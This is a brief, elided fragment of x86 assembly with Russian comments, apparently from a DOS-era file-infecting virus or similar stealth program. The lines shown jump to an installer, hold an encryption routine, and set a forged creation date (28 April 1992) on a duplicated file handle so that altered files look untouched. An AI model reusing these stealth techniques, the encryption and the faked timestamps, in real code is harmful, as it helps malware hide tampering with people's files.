...
ENTRY:		jmp	install	;Переход на программу-загрузчик
	...
	LEN	dw ?		; Длина буфера MY_PATH
     COUNT	db ?
	TIM	dw 6080h	; Ложное время создания файла
	DAT     dw 169Ch        ; 28 апреля 1992
...
ENCRYPT:        mov     ah,byte ptr [bx][di]
 ...
 MISMATCH:	xdup	HANDL			; Создать дубликат хендла
		mov	HDUPL,ax		
	get_set_date_time HDUPL,1,TIM,DAT  ; Устанавл. ложное время создания
